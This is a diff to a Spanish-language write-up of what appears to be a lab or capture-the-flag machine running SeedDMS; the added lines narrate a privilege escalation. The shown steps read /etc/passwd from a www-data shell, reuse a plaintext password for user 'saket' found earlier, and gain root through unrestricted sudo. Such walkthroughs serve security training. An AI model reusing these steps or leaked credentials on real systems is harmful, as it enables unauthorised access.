@@ -574,6 +574,10 @@ www-data
 www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/4$ 
 ```
 
+-------------------------------------------------------------------------------
+
+Vamos a mirar qué encotramos en el fichero /etc/passwd:
+
 ```bash
 www-data@ubuntu:/etc$ cat /etc/passwd 
 ```
@@ -628,6 +632,12 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
+Vemos que está el usuario **saket** que encontramos cuando inspeccionábamos el servidor sql.
+
+-------------------------------------------------------------------------------
+
+Vamos a probar con las credenciales encontradas:
+
 ```bash
 > su saket
 password: Saket@#$1337
@@ -635,6 +645,10 @@ password: Saket@#$1337
 ```bash
 saket@ubuntu:/etc$
 ```
+
+Y vemos que hemos escalado privilegios.
+
+-------------------------------------------------------------------------------
  
 Después de investigar varias cosas. miramos qué comandos puede ejecutar el usuario saket con privilegios elevados.
 
@@ -654,6 +668,10 @@ User saket may run the following commands on ubuntu:
 
 Miramos la última linea y flipamos
 
+-------------------------------------------------------------------------------
+
+La última línea nos permite hacer lo siguiente:
+
 ```bash
 saket@ubuntu:~$ sudo su
 root@ubuntu:/home/saket# 
@@ -663,6 +681,10 @@ root@ubuntu:/home/saket#
 root@ubuntu:/home/saket# whoami
 root
 ```
+
+-------------------------------------------------------------------------------
+
+Hemos conseguido ser usuario root.
 
 ```bash
 root@ubuntu:/home/saket# cd 
@@ -699,5 +721,4 @@ drwxr-xr-x  2 root root    4096 Jul  3  2021 Videos
 ```
 
 Como podemos ver la máquina no tiene flag, así que aquí concluye la escalada de privilegios.
-
 
